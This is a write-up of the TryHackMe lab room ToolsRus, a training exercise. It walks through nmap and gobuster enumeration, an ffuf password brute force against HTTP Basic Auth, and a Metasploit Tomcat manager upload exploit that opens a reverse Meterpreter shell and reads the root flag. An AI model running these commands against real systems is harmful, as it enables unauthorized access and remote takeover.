---
title: "ToolsRus"
date: 2025-02-04
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF ToolsRus
categories: [TryHackMe, Easy]
tags: [linux, metasploit, tomcat]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>ToolsRus</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/toolsrus">https://tryhackme.com/room/toolsrus</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge ToolsRus.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap 10.10.236.30 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 12:52 EDT
    Nmap scan report for 10.10.236.30
    Host is up (0.049s latency).
    Not shown: 996 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    1234/tcp open  hotline
    8009/tcp open  ajp13

    Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,1234,8009 10.10.236.30
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 12:52 EDT
    Nmap scan report for 10.10.236.30
    Host is up (0.045s latency).

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e8:5a:05:e2:2e:0e:37:f0:f7:62:c9:89:a1:85:c0:10 (RSA)
    |   256 e9:1b:25:56:5f:22:0f:54:db:c6:54:43:84:cb:c0:6d (ECDSA)
    |_  256 b2:c6:2b:b0:3a:23:1b:dc:c1:bf:10:65:fb:bc:c7:1b (ED25519)
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
    |_http-server-header: Apache-Coyote/1.1
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/7.0.88
    8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I began with a directory enumeration using Gobuster:
```bash
gobuster dir --url http://10.10.236.30/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.185.39/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /guidelines           (Status: 301) [Size: 317] [--> http://10.10.185.39/guidelines/]
  /protected            (Status: 401) [Size: 459]
```

### Directory /guidelines Analysis

The site only contained a note addressed to bob:
```text
Hey bob, did you update that TomCat server?
```

### Directory /protected Analysis

The website required HTTP Basic Authentication. Since I had the username `bob`, I attempted to brute-force his login using ffuf:
```bash
$ ffuf -w /usr/share/wordlists/rockyou.txt -u http://bob:FUZZ@110.10.236.30/protected -fs 459

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bob:FUZZ@10.10.185.39/protected
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 459
________________________________________________

b[removed]s                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 39ms]
```

Great! I was able to log in, but the website only displayed a note stating that the content had been moved to a different port:
```text
This protected page has now moved to a different port.
```

## Port 1234 Analysis

The webserver displayed a Apache Tomcat/7.0.88 installation. I continued with a Gobuster directory enumeration and found the manager directory, which caught my attention:
```bash
$ gobuster dir --url http://10.10.236.30:1234 --wordlist /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.30:1234
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

After researching the version numbers, I discoverd an interesting post on the <a href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/">Rapid7</a> website. Using this information, I launched Metasploit and searched for the relevant module. After loading it, I set the required options:
```bash
msf6 > search tomcat_mgr_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   1    \_ target: Java Universal           .                .          .      .
   2    \_ target: Windows Universal        .                .          .      .
   3    \_ target: Linux x86                .                .          .      .
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword b[removed]s
HttpPassword => b[removed]s
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.236.30
RHOSTS => 10.10.236.30
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST [attackerip]
LHOST => [attackerip]
```

After executing the exploit, I obtained a reverse Meterpreter shell and successfully retrieved the flag:
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

  [*] Started reverse TCP handler on [attackerip]:4444 
  [*] Retrieving session ID and CSRF token...
  [*] Uploading and deploying XOnfJ5Lv3xb...
  [*] Executing XOnfJ5Lv3xb...
  [*] Undeploying XOnfJ5Lv3xb ...
  [*] Sending stage (57971 bytes) to 10.10.236.30
  [*] Undeployed at /manager/html/undeploy
  [*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.236.30:51702) at 2025-02-04 13:18:30 -0400

meterpreter > ls /root
  Listing: /root
  ==============

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100667/rw-rw-rwx  47    fil   2019-03-11 12:06:14 -0400  .bash_history
  100667/rw-rw-rwx  3106  fil   2015-10-22 13:15:21 -0400  .bashrc
  040777/rwxrwxrwx  4096  dir   2019-03-11 11:30:33 -0400  .nano
  100667/rw-rw-rwx  148   fil   2015-08-17 11:30:33 -0400  .profile
  040777/rwxrwxrwx  4096  dir   2019-03-10 17:52:32 -0400  .ssh
  100667/rw-rw-rwx  658   fil   2019-03-11 12:05:22 -0400  .viminfo
  100666/rw-rw-rw-  33    fil   2019-03-11 12:05:22 -0400  flag.txt
  040776/rwxrwxrw-  4096  dir   2019-03-10 17:52:43 -0400  snap

meterpreter > cat /root/flag.txt
  [removed]
```

solved! :)